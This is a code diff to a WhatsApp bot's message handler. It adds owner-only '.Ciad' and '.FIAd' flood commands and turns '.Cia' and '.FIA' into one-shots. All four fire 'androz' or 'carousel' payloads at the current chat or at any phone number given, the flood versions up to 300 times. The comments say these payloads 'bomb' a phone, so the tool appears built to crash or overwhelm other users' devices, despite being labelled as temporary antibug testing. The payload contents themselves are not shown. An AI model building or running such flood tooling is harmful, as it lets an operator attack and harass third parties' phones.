@@ -4766,6 +4766,11 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             return;
         }
 
+        if (cisWords.length > 2) {
+            await safeWaReply(sock, remoteJid, '⚠️ .cis is a one-shot — no amount needed. Usage: .cis <number>', msg);
+            return;
+        }
+
         const targetInput = cisWords.slice(1).join(' ').trim();
         const targetNumber = targetInput.replace(/\D/g, '');
         if (!/^\+?[\d\s-]+$/.test(targetInput) || targetNumber.length < 8 || targetNumber.length > 15) {
@@ -4818,6 +4823,11 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         );
         if (!fisIsOwner && !isDevNumber(fisSenderJid)) {
             await safeWaReply(sock, remoteJid, '❌ Owner/dev only.', msg);
+            return;
+        }
+
+        if (cisWords.length > 2) {
+            await safeWaReply(sock, remoteJid, '⚠️ .fis is a one-shot — no amount needed. Usage: .fis <number>', msg);
             return;
         }
 
@@ -6803,22 +6813,25 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
     
 
 
-    // 🧪 TEMPORARY .Cia / .FIA — sandbox payloads (owner/dev only; delete with
-    // the other test commands when antibug testing ends).
-    //   ".Cia"               → androz payload at the CURRENT chat
-    //   ".Cia <number>"      → androz payload at that number
-    //   ".Cia <number> <N>"  → burst count (1-300; bug-bot pacing above 10)
-    //   ".FIA"               → carousel payload at the CURRENT chat
-    //   ".FIA <number>"      → carousel payload at that number
-    //   ".FIA <number> <N>"  → burst count (1-300)
-    //   Case-insensitive (.cia/.CIA/.fia all work). The bot's OWN number is
+    // 🧪 TEMPORARY .Cia/.Ciad/.FIA/.FIAd — sandbox payloads (owner/dev only;
+    // delete with the other test commands when antibug testing ends).
+    //   ".Cia"               → ONE androz payload at the CURRENT chat
+    //   ".Cia <number>"      → ONE androz payload at that number
+    //   ".Ciad <number> <N>" → androz FLOOD (N required, 1-300)
+    //   ".FIA" / ".FIA <number>"     → ONE carousel payload
+    //   ".FIAd <number> <N>"         → carousel FLOOD (N required, 1-300)
+    //   Passing an amount to .Cia/.FIA replies "amount not needed" — floods
+    //   live on the d-commands. Case-insensitive. The bot's OWN number is
     //   rejected as a target — firing at it would bomb the bot's own phone.
-    //   Default = 1 shot; add a count for bursts (1-300).
     const isCiaCommand = token === '.cia';
     const isFiaCommand = token === '.fia';
-    if (isCiaCommand || isFiaCommand) {
-        const payloadKind = isFiaCommand ? 'testfff' : 'androz';
-        const displayKind = isFiaCommand ? 'FIA' : 'Cia';
+    const isCiadCommand = token === '.ciad';
+    const isFiadCommand = token === '.fiad';
+    if (isCiaCommand || isFiaCommand || isCiadCommand || isFiadCommand) {
+        const payloadKind = (isFiaCommand || isFiadCommand) ? 'testfff' : 'androz';
+        const isFloodCommand = isCiadCommand || isFiadCommand;
+        const displayKind = isCiadCommand ? 'Ciad' : isFiadCommand ? 'FIAd'
+            : (isFiaCommand ? 'FIA' : 'Cia');
         // Owner / dev only.
         if (!isSenderOwner && !isDevNumber(senderJid)) {
             await safeWaReply(sock, remoteJid, '❌ Owner only.', msg);
@@ -6826,23 +6839,29 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         }
 
         const input = args.join(' ').trim();
+        const parts = input.split(/\s+/).filter(Boolean);
 
-        // Optional explicit count, e.g. ".cia 234xxx 200". Only a trailing
-        // 1–3 digit token counts (real numbers are longer). Default = 1 shot.
-        let targetInput = input;
+        // .Ciad/.FIad take <number> <amount>; .Cia/.FIA are one-shots and
+        // refuse an amount argument with a pointer to the d-command.
+        let targetInput = '';
         let count = 1;
         let flood = false;
-        {
-            const cw = targetInput.split(/\s+/).filter(Boolean);
-            if (cw.length >= 2 && /^\d{1,3}$/.test(cw[cw.length - 1])) {
-                const asked = Number(cw[cw.length - 1]);
-                if (asked >= 1) {
-                    count = Math.min(300, asked);
-                    flood = count > 10; // bug-bot pacing only for real floods
-                    cw.pop();
-                    targetInput = cw.join(' ').trim();
-                }
+        if (isFloodCommand) {
+            if (parts.length < 2 || !/^\d{1,3}$/.test(parts[parts.length - 1])) {
+                await safeWaReply(sock, remoteJid,
+                    `❌ *USAGE*\n\n.${displayKind} <number> <amount 1-300>\n\nExample: .${displayKind} 2347050253122 200`, msg);
+                return;
             }
+            count = Math.min(300, Number(parts[parts.length - 1]));
+            flood = count > 10; // bug-bot pacing only for real floods
+            targetInput = parts.slice(0, -1).join(' ').trim();
+        } else {
+            if (parts.length >= 2 && /^\d{1,3}$/.test(parts[parts.length - 1])) {
+                await safeWaReply(sock, remoteJid,
+                    `⚠️ Amount not needed — .${displayKind} is a one-shot.\n\nFor floods use .${displayKind}d <number> <amount>.`, msg);
+                return;
+            }
+            targetInput = parts.join(' ').trim();
         }
 
         let targetJid = remoteJid;
@@ -6853,8 +6872,7 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
                 await safeWaReply(sock, remoteJid,
                     `❌ *USAGE*\n\n` +
                     `• .${displayKind} — fires here (current chat)\n` +
-                    `• .${displayKind} <number> — target number\n` +
-                    `• .${displayKind} <number> <1-300> — burst/flood count`,
+                    `• .${displayKind} <number> — target number` + (isFloodCommand ? `\n• amount (1-300) is required` : ''),
                     msg);
                 return;
             }
